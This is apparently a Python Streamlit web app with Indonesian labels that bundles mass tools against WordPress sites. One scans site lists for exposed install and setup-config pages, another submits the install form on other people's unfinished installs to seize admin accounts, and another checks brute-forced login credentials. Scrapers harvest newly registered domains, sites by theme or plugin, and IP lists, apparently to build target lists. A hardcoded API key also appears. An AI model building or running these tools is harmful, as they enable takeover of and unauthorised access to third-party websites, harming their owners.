import streamlit as st
import pandas as pd
import numpy as np
from PIL import Image
from ipaddress import IPv4Network
from bs4 import BeautifulSoup
from socket import gethostbyname
import random
import requests
import os
import time
import json
import re

class CheckDAPA:
	def __init__(self):
		self.check_domain()
		
	def check_domain(self):
		domain_input = st.text_area('Masukan Domain')
		li = domain_input.split("\n")
		url = 'https://rasenmedia.my.id/api/dapa?apikey=lutpipantadhitamm&domain='
		get_now = st.button('Check!')
		if get_now:
			for dom in li:
				try:
					st.write(f'**Domain : {dom}**')
					req = requests.get(url+str(dom)).text
					parse = json.loads(req)
					da = parse['DA']
					pa = parse['PA']
					mr = parse['MR']
					data = {f'Domain':[dom],'DA':[da], 'PA':[pa], 'MR':[mr]}
					table_data = pd.DataFrame(
					data,
					columns=('Domain','DA','PA','MR'),
					index=['1'])
					st.table(table_data)
				except:
					st.error('APi error or Wrong input domain')
					
class AutoWPInstall:
	def __init__(self):
		self.user_agent()
		self.agent()
		self.auto_wp_install()
		
	def user_agent(self):
		ua = open('user-agents.txt','r').read().splitlines()
		return random.choice(ua)
		
	def agent(self):
		agents = {'User-Agent':self.user_agent()}
		return agents
		
	def auto_wp_install(self):
		try:
			st.info('List site harus dengan step 2, jika site sebelumnya udah di install maka akan tertulis succes install')
			st.info('Contoh : site.com/wp-admin/install.php?step=2')
			target_input = st.text_area('Masukan  Site + Path Step 2 : ')
			lis = target_input.split('\n')
			title_input = st.text_input('Judul Website : ')
			user_input = st.text_input('Username : ')
			pw_input = st.text_input('Password : ')
			email_input = st.text_input('Email : ')
			klik = st.button('Run Install !')
			if klik:
				for target in lis:
					title = title_input
					username = user_input
					password = pw_input
					email = email_input
					sub = 'submit'
					
					uagent = self.agent()
					r = requests.Session()
					site = target.replace('/wp-admin/install.php?step=2','')
					http_data = {
					'weblog_title':title,
					'user_name':username,
					'admin_password':password,
					'admin_password2':password,
					'pw_weak':1,
					'admin_email':email,
					'blog_public':0,
					'submit':sub
					}
					req = r.post(target, headers=uagent, data=http_data).text
					space_delete = site.strip()
					detect = f'<a href="{space_delete}/wp-login.php" class="button button-large">'
					
					if detect in req:
						succes_install = f'<p style="font-family:sans-serif; color:Green; font-size: 12px;">{target} [Succes Install]</p>'
						st.markdown(succes_install, unsafe_allow_html=True)
						file = open('Result-WP-Install.txt', 'a').write(target+'\n')
					else:
						failed_install = f'<p style="font-family:sans-serif; color:Red; font-size: 12px;">{target} [Failed Install]</p>'
						st.markdown(failed_install, unsafe_allow_html=True)
				with open('Result-WP-Install.txt','r') as data:
					st.download_button(
					label='Download Result Succes Install',
					data=data,
					file_name='Result Succes Install.txt',
					mime='text/plain',
					)
				with st.spinner('Silahkan download resultnya..'):
					time.sleep(30)
					os.remove('Result-WP-Install.txt')
				st.success('Result di hapus dari server!')
		except Exception as e:
			st.write(f'{e}')
			
class XMLPRCResultCheckLogin:
	def __init__(self):
		self.uagent()
		self.xmlrpc_bf_check()
		
	def uagent(self):
		ua = open('user-agents.txt','r').read().splitlines()
		return random.choice(ua)
		
	def xmlrpc_bf_check(self):
		try:
			st.info('Masukan site sesuai yang anda di contoh, bisa mass maupun satu, bisa untuk cek login lain tidak harus result xmlrpc bruteforce.')
			site_input = st.text_area('Masukan Site (site.com#username@pass) : ')
			splitsite = site_input.split('\n')
			bttn = st.button('Check Site !')
			if bttn:
				for site in splitsite:
					try:
						wp_login = site.split('#')[0]
						#wp-login.php
						wp_admin1 = wp_login.replace('/wp-login.php','')
						wp_admin = wp_admin1+'/wp-admin'
						#wp-admin
						username1 = site.split('#',1)[1]
						username = username1.split('@',1)[0]
						#username
						password = site.split('@',1)[1]
						#password
						try:
							try:
								try:
									agents = self.uagent()
									req = requests.Session()
									headers1 = {
									'User-Agent':agents,
									'Cookie':'wordpress_test_cookie=WP Cookie check'
									}
									datar={
									'log':username, 'pwd':password, 'wp-submit':'Log In', 
									'redirect_to':wp_admin, 'testcookie':'1'
									}
									login = req.post(wp_login, headers=headers1, data=datar)
									reqs = req.get(wp_admin).text
									if 'wp-toolbar' in reqs:
										succes_login = f'<p style="font-family:sans-serif; color:Green; font-size: 13px;">{site} | Succes Login |</p>'
										st.markdown(succes_login, unsafe_allow_html=True)
										files = open('Result-XMLRPC.txt', 'a').write(site+'\n')
									else:
										failed_login = f'<p style="font-family:sans-serif; color:Red; font-size: 13px;">{site} | Failed Login |</p>'
										st.markdown(failed_login, unsafe_allow_html=True)
								except requests.exceptions.Timeout:
									error_login = f'<p style="font-family:sans-serif; color:Orange; font-size: 13px;">{site} | Timeout Error |</p>'
									st.markdown(error_login, unsafe_allow_html=True)
							except requests.exceptions.RequestException:
								error_login = f'<p style="font-family:sans-serif; color:Orange; font-size: 13px;">{site} | Error Something Else |</p>'
								st.markdown(error_login, unsafe_allow_html=True)
						except requests.exceptions.ConnectionError:
							error_login = f'<p style="font-family:sans-serif; color:Orange; font-size: 13px;">{site} | Connection Error |</p>'
							st.markdown(error_login, unsafe_allow_html=True)
					except requests.exceptions.HTTPError:
						error_login = f'<p style="font-family:sans-serif; color:Orange; font-size: 13px;">{site} | HTTP Error |</p>'
						st.markdown(error_login, unsafe_allow_html=True)
				with open('Result-XMLRPC.txt','r') as data:
					st.download_button(
					label='Download Result Succes Login',
					data=data,
					file_name='(XMLRPC) Result Succes Login.txt',
					mime='text/plain',
					)
				with st.spinner('Silahkan download resultnya..'):
					time.sleep(30)
					os.remove('Result-XMLRPC.txt')
				st.success('Result di hapus dari server!')
		except Exception as e:
			st.write(f'{e}')
			
class RangeIP:
  	def __init__(self):
  		self.rangeipaddress()
  	
  	def rangeipaddress(self):
  		st.info('IP tanpa menggunakan http://, contoh (10.203.17.18) murni ip tidak ada garis')
  		ip_input = st.text_area('Masukan IP (mass or one) : ')
  		list = ip_input.split('\n')
  		bttn = st.button('Run Range !')
  		if bttn:
  			for ip in list:
  				try:
  					range = IPv4Network(ip+'/24',False)
  					for ipa in range:
  						files = open('Result-Range-IP.txt','a').write(str(ipa)+'\n')
  				except:
  					st.error('Error, jangan gunakan http:// atau / dan sejenisnya')
  					
  			reads = open('Result-Range-IP.txt','r').read()
  			add_space = (' '.join(reads))
  			st.text_area('Result : ',add_space)
  			
  			st.download_button(
  			label='Download Result Range IP',
  			data=reads,
  			file_name='Result Range IP.txt',
  			mime='text/plain',
  			)
  			
  			with st.spinner('Silahkan download resultnya..'):
  				time.sleep(15)
  				os.remove('Result-Range-IP.txt')
  			st.success('Result di hapus dari server!')
  			
class GrabSiteRankData:
  		def __init__(self):
  			self.grabber_site()
  			self.user_agent()
  			self.agent()
  			
  		def user_agent(self):
  			ua = open('user-agents.txt','r').read().splitlines()
  			return random.choice(ua)
  			
  		def agent(self):
  			agents = {'User-Agent':self.user_agent()}
  			return agents
  		
  		def grabber_site(self):
  			st.info('Date terbaru adalah hari kemarin, jika page nya belum sampai pada input akan error')
  			tgl_input = st.date_input('Masukan Tanggal : ')
  			start_page = int(st.number_input('Mulai dari page : ',0))
  			end_page = int(st.number_input('Sampai page : ',0))
  			page_start=(start_page-1)
  			page_end=(end_page+1)
  			page=int(0)
  			bttn = st.button('Grab !')
  			if bttn:
  				while True:
  					page_start += 1
  					page += 50
  					agent = self.agent()
  					url = 'https://siterankdata.com/show/detected/'+str(tgl_input)+'/'+str(page_start)+'-'+str(page)
  					req = requests.get(url,headers=agent).text
  					bs = BeautifulSoup(req,'html.parser')
  					cari = bs.find_all('h4',class_='m-b-xs')
  					berhenti = 'https://siterankdata.com/show/detected/'+str(tgl_input)+'/'+str(page_end)+'-'+str(page)
  					if berhenti in url:
  						st.write(f'**Berhenti di page {end_page}**')
  						break
  					else:
  						for find_txt in cari:
  							get_txt = find_txt.find('a').get_text()
  							files = open('Data-Grab.txt','a').write(get_txt+'\n')
  							
  				reads = open('Data-Grab.txt','r').read()
  				add_space = (' '.join(reads))
  				st.text_area('Result : ',add_space)
  				
  				filename = f'Grab {tgl_input}.txt'
  				st.download_button(
  				label='Download Result Grab',
  				data=reads,
  				file_name=filename,
  				mime='text/plain',
  				)
  				
  				with st.spinner('Silahkan download resultnya..'):
  					time.sleep(15)
  					os.remove('Data-Grab.txt')
  				st.success('Result di hapus dari server!')
  				
class WPInstallChecker:
  				def __init__(self):
  					self.user_agent()
  					self.checker_wp_install()
  					
  				def user_agent(self):
  					ua = open('user-agents.txt', 'r').read().splitlines()
  					return random.choice(ua)
  					
  				def checker_wp_install(self):
  					st.info('Masukan domain saja atau tambahkan path juga bisa, contoh input (http://site.com) ')
  					site_input = st.text_area('Masukan Site (mass or one) : ')
  					list = site_input.split('\n')
  					bttn = st.button('Check !')
  					if bttn:
  						try:
  							for sites in list:
  								Agents = {'User-Agent':self.user_agent()}
  								exploit1 = sites+'/wp-admin/install.php?step=1'
  								r = requests.get(exploit1, headers=Agents)
  								if '<form id="setup" method="post" action="install.php?step=2" novalidate="novalidate">' in r.text:
  									wp_install = f'<p style="font-family:sans-serif; color:Green; font-size: 13px;">{exploit1} [Exist]</p>'
  									st.markdown(wp_install,unsafe_allow_html=True)
  									open('WPInstall.txt','a').write(exploit1+'\n')
  								else:
  									wp_installs = f'<p style="font-family:sans-serif; color:Red; font-size: 13px;">{exploit1} [Not Exist]</p>'
  									st.markdown(wp_installs,unsafe_allow_html=True)
  						except Exception as e:
  							print(f'{exploit1} : {e}')
  						
  						try:
  							with open('WPInstall.txt','r') as data:
  								st.download_button(
  								label='Download Result Check',
  								data=data,
  								file_name='Result Check WP Install.txt',
  								mime='text/plain',
  								)
  							with st.spinner('Silahkan download resultnya..'):
  								time.sleep(15)
  								os.remove('WPInstall.txt')
  							st.success('Result di hapus dari server!')
  						except:
  							st.error('Error data file')
  							
class WPConfigChecker:
  				def __init__(self):
  					self.user_agent()
  					self.checker_wp_config()
  					
  				def user_agent(self):
  					ua = open('user-agents.txt', 'r').read().splitlines()
  					return random.choice(ua)
  					
  				def checker_wp_config(self):
  					st.info('Masukan domain saja atau tambahkan path juga bisa, contoh input (http://site.com) ')
  					site_input = st.text_area('Masukan Site (mass or one) : ')
  					list = site_input.split('\n')
  					bttn = st.button('Check !')
  					if bttn:
  						try:
  							for sites in list:
  								Agents = {'User-Agent':self.user_agent()}
  								exploit1 = sites+'/wp-admin/setup-config.php?step=1'
  								r = requests.get(exploit1, headers=Agents)
  								if '<form method="post" action="setup-config.php?step=2">' in r.text:
  									wp_config = f'<p style="font-family:sans-serif; color:Green; font-size: 13px;">{exploit1} [Exist]</p>'
  									st.markdown(wp_config,unsafe_allow_html=True)
  									open('WPConfig.txt','a').write(exploit1+'\n')
  								else:
  									wp_installs = f'<p style="font-family:sans-serif; color:Red; font-size: 13px;">{exploit1} [Not Exist]</p>'
  									st.markdown(wp_installs,unsafe_allow_html=True)
  						except Exception as e:
  							print(f'{exploit1} : {e}')
  						
  						try:
  							with open('WPConfig.txt','r') as data:
  								st.download_button(
  								label='Download Result Check',
  								data=data,
  								file_name='Result Check WP Setup Config.txt',
  								mime='text/plain',
  								)
  							with st.spinner('Silahkan download resultnya..'):
  								time.sleep(15)
  								os.remove('WPConfig.txt')
  							st.success('Result di hapus dari server!')
  						except:
  							st.error('Error data file')
  							
class WebStatusCode:
  				def __init__(self):
  					self.user_agent()
  					self.status_code_web()
  					
  				def user_agent(self):
  					ua = open('user-agents.txt', 'r').read().splitlines()
  					return random.choice(ua)
  					
  				def status_code_web(self):
  					st.info('URL harus menggunakan awalan http:// atau https://, contoh (http://site.com) ')
  					url_input = st.text_area('Masukan URL (mass or one) : ')
  					list = url_input.split('\n')
  					bttn = st.button('Run !')
  					if bttn:
  						for url in list:
  							try:
  								agents = {'User-Agent':self.user_agent()}
  								req = requests.get(url,headers=agents)
  								status_code = req.status_code
  								data = {f'URL':[url],'Status':[status_code]}
  								table_data = pd.DataFrame(
  								data,
  								columns=('URL','Status'),
  								index=['1'])
  								st.table(table_data)
  							except:
  								data = {f'URL':[url],'Status':['Error URL']}
  								table_data = pd.DataFrame(
  								data,
  								columns=('URL','Status'),
  								index=['1'])
  								st.table(table_data)
  								
class GrabCubDomain:
  def __init__(self):
    self.grab_domain_cub()
    self.user_agent()
    self.agent()
    
  def user_agent(self):
    ua = open('user-agents.txt','r').read().splitlines()
    return random.choice(ua)
    
  def agent(self):
    agents = {'User-Agent':self.user_agent()}
    return agents
    
  def grab_domain_cub(self):
    st.info('Date terbaru adalah kemarin, tunggu prosesnya karena banyak domain per pagenya!')
    input_tgl = st.date_input('Masukan Tanggal : ')
    start_page = int(st.number_input('Mulai Page : ',0))
    end_page = int(st.number_input('Sampai Page : ',0))
    page=(start_page-1)
    pages=(end_page+1)
    
    bttn = st.button('Grab now!')
    if bttn:
      while True:
        page += 1
        agents = self.agent()
        url = f'https://www.cubdomain.com/domains-registered-by-date/{input_tgl}/{page}'
        req = requests.get(url,headers=agents).text
        bs = BeautifulSoup(req,'html.parser')
        find_tag = bs.find_all('div',class_='col-md-4')
        stop = f'https://www.cubdomain.com/domains-registered-by-date/{input_tgl}/{pages}'
        if stop in url:
        	st.markdown(f'**berhenti di page** {end_page}')
        	break
        else:
          for get_tag in find_tag:
          	get_text = get_tag.get_text()
          	delete_space = get_text.strip()
          	open('HasilGrab.txt','a').write(delete_space+'\n')
          	
      reads = open('HasilGrab.txt','r').read()
      add_space = (' '.join(reads))
      st.text_area('Result : ',add_space)
      filename = f'Grab {input_tgl}.txt'
      st.download_button(
        label='Download Result Grab',
        data=reads,
        file_name=filename,
        mime='text/plain',
        )
        
      with st.spinner('Silahkan download resultnya..'):
        time.sleep(15)
        os.remove('HasilGrab.txt')
      st.success('Result di hapus dari server!')
      
class DomainToIP:
  				def __init__(self):
  					self.domainkeip()
  				def domainkeip(self):
  					st.info('Domain tanpa http:// atau www. jika pake itu akan error')
  					domain_inp = st.text_area('Masukan domain tanpa http://, www ')
  					list_domain = domain_inp.split('\n')
  					bttn = st.button('Run')
  					if bttn:
  						try:
  							for domain in list_domain:
  								ips = gethostbyname(domain)
  								open('IPAdd.txt','a').write(ips+'\n')
  								
  							reads = open('IPAdd.txt','r').read()
  							readt = (' '.join(reads))
  							st.text_area('Result', readt)
  							
  							st.download_button(
  							label='Download Result IP',
  							data=reads,
  							file_name='Result Domain To IP.txt',
  							mime='text/plain',
  							)
  							
  							with st.spinner('Silahkan download resultnya..'):
  								time.sleep(15)
  								os.remove('IPAdd.txt')
  							st.success('Result di hapus dari server!') 
  							
  						except Exception as e:
  							st.write(e)
  							
class GrabDomainByTheme:
	def __init__(self):
		self.themedomaingrab()
		self.user_agent()
		
	def user_agent(self):
		ua = open('user-agents.txt', 'r').read().splitlines()
		return random.choice(ua)
		
	def themedomaingrab(self):
		st.info('Bingung nama theme nya? cek themetix.com untuk mendapatkan nama themenya.')
		theme_name = st.text_input('Nama Theme : ')
		start_page = st.number_input('Mulai dari Page : ',0)
		end_page = st.number_input('Akhir di Page : ',0)
		bttn = st.button('Grab !')
		page=0
		if bttn:
			try:
				while True:
					page +=1
					uag = {'User-Agent':self.user_agent()}
					url = f'https://themetix.com/{theme_name}/{str(page)}'
					stop = "https://themetix.com/"+theme_name+"/"+str(end_page+1)
					req = requests.get(url,headers=uag)
					reg = re.findall('<p style="margin-bottom: 20px">(.*?)</p></a>', req.text)
					if stop in url:
						st.write(f'**berhenti di page** {end_page}')
						break
					else:
						for domain in reg:
							open('ThemeGrab.txt','a').write(domain+'\n')
				reads = open('ThemeGrab.txt','r').read()
				spc = (' '.join(reads))
				st.text_area('Result : ',spc)
				
				st.download_button(
				label='Download Result Grab Theme',
				data=reads,
				file_name=f'Result Grab Theme {theme_name}.txt',
				mime='text/plain',
				)
				
				with st.spinner('Silahkan download resultnya..'):
					time.sleep(15)
					os.remove('ThemeGrab.txt')
				st.success('Result di hapus dari server!') 
  							
			except Exception as e:
				st.write(e)
				
class GrabDomainByPlugin:
	def __init__(self):
		self.plugindomaingrab()
		self.user_agent()
		
	def user_agent(self):
		ua = open('user-agents.txt', 'r').read().splitlines()
		return random.choice(ua)
		
	def plugindomaingrab(self):
		st.info('Bingung nama plugin nya? cek pluginu.com untuk mendapatkan nama themenya.')
		theme_name = st.text_input('Nama Plugin : ')
		start_page = st.number_input('Mulai dari Page : ',0)
		end_page = st.number_input('Akhir di Page : ',0)
		bttn = st.button('Grab !')
		page=0
		if bttn:
			try:
				while True:
					page +=1
					uag = {'User-Agent':self.user_agent()}
					url = f'https://pluginu.com/{theme_name}/{str(page)}'
					stop = "https://pluginu.com/"+theme_name+"/"+str(end_page+1)
					req = requests.get(url,headers=uag)
					reg = re.findall('<p style="margin-bottom: 20px">(.*?)</p></a>', req.text)
					if stop in url:
						st.write(f'**berhenti di page** {end_page}')
						break
					else:
						for domain in reg:
							open('PluginGrab.txt','a').write(domain+'\n')
				reads = open('PluginGrab.txt','r').read()
				spc = (' '.join(reads))
				st.text_area('Result : ',spc)
				
				st.download_button(
				label='Download Result Grab',
				data=reads,
				file_name=f'Result Grab Plugin {theme_name}.txt',
				mime='text/plain',
				)
				
				with st.spinner('Silahkan download resultnya..'):
					time.sleep(15)
					os.remove('PluginGrab.txt')
				st.success('Result di hapus dari server!') 
  							
			except Exception as e:
				st.write(e)
				
class IPGrabber:
				def __init__(self):
					self.grabberip()
					self.user_agent()
					
				def user_agent(self):
					ua = open('user-agents.txt', 'r').read().splitlines()
					return random.choice(ua)
				
				def grabberip(self):
					st.info('Max page 17754, lebih dari itu akan reset ke page 1')
					start_page = st.number_input('Dari Page : ',0)
					end_page = st.number_input('Akhir di Page : ',0)
					bttn = st.button('Grab !')
					page=0
					if bttn:
						try:
							while True:
								page+=1
								agents = {'User-Agent':self.user_agent()}
								url = 'http://bitverzo.com/recent_ip?p='+str(page)
								stop = 'http://bitverzo.com/recent_ip?p='+str(end_page+1)
								req = requests.get(url, headers=agents)
								if stop in url:
									st.write(f'**berhenti di page** {end_page}')
									break
								else:
									bs = BeautifulSoup(req.text,'html.parser')
									cari = bs.find_all("div", {'class':'col-md-3'})
									for mencari in cari:
										cari1 = mencari.find("a").get_text()
										open('GrabIP.txt','a').write(cari1+'\n')
										
							reads = open('GrabIP.txt','r').read()
							spc = (' '.join(reads))
							st.text_area('Result : ',spc)
							
							st.download_button(
							label='Download Result Grab',
							data=reads,
							file_name='Result Grab IP.txt',
							mime='text/plain',
							)
							
							with st.spinner('Silahkan download resultnya..'):
								time.sleep(15)
								os.remove('GrabIP.txt')
							st.success('Result di hapus dari server!') 
							
						except Exception as e:
							st.write(e)
							
if __name__ == '__main__':
	
	st.set_page_config(
	page_title = 'Web App | Wannaz',
	page_icon=':shark',
	menu_items={
	'Get Help': 'http://wa.me/6281328303820',
	'Report a Bug': 'http://wa.me/6281328303820',
	'About': 'Free Tools Online by Wannaz'}
	)
	
	hide_streamlit_style = '''
            <style>
            #MainMenu {visibility: hidden;}
            footer {visibility: hidden;}
            </style>
            '''
	st.markdown(hide_streamlit_style, unsafe_allow_html=True)
	image = Image.open('banner.png')
	st.image(image)
	menu_input = st.selectbox('**Pilih Tools**',['DA PA Checker','Auto Wordpress Install','XMLRPC BF Result Check Login','Range IP Address','Grabber Domain SiteRankData','WordPress Install Checker','WordPress Setup Config Checker','Website Status Code','Grab Cub Domain','Domain to IP Address','Grab Domain WP by Theme','Grab Domain WP by Plugin','Grabber IP Address'])
	if menu_input == 'DA PA Checker':
		st.write('# DA PA Checker')
		st.info('Masukan domain dengan benar hehe')
		domain_check = CheckDAPA()
	elif menu_input == 'Auto Wordpress Install':
		st.write('# Auto Wordpress Install')
		wp_install = AutoWPInstall()
	elif menu_input == 'XMLRPC BF Result Check Login':
		st.write('# Result XMLRPC BF Check Login')
		check_xmlrpc = XMLPRCResultCheckLogin()
	elif menu_input == 'Range IP Address':
		st.write('# Range IP Address')
		ranges_ip = RangeIP()
	elif menu_input == 'Grabber Domain SiteRankData':
		st.write('# Grab Domain SiteRankData')
		grab_domain = GrabSiteRankData()
	elif menu_input == 'WordPress Install Checker':
		st.write('# WP Install Checker')
		install_wp = WPInstallChecker()
	elif menu_input == 'WordPress Setup Config Checker':
		st.write('# WP Setup Config Checker')
		setup_config = WPConfigChecker()
	elif menu_input == 'Website Status Code':
		st.write('# Website Status Code')
		status_code = WebStatusCode()
	elif menu_input == 'Domain to IP Address':
		st.write('# Domain to IP')
		domen_ip = DomainToIP()
	elif menu_input == 'Grab Domain WP by Theme':
		st.write('# Grab Domain by Theme')
		grab_domain_by_theme = GrabDomainByTheme()
	elif menu_input == 'Grab Domain WP by Plugin':
		st.write('# Grab Domain by Plugin')
		grab_domain_by_plugin = GrabDomainByPlugin()
	elif menu_input == 'Grabber IP Address':
		st.write('# Grab Recent IP Address')
		grabber_ip = IPGrabber()
	elif menu_input == 'Grab Cub Domain':
	  st.write('# Grab Cub Domain by Date')
	  grab_domain = GrabCubDomain()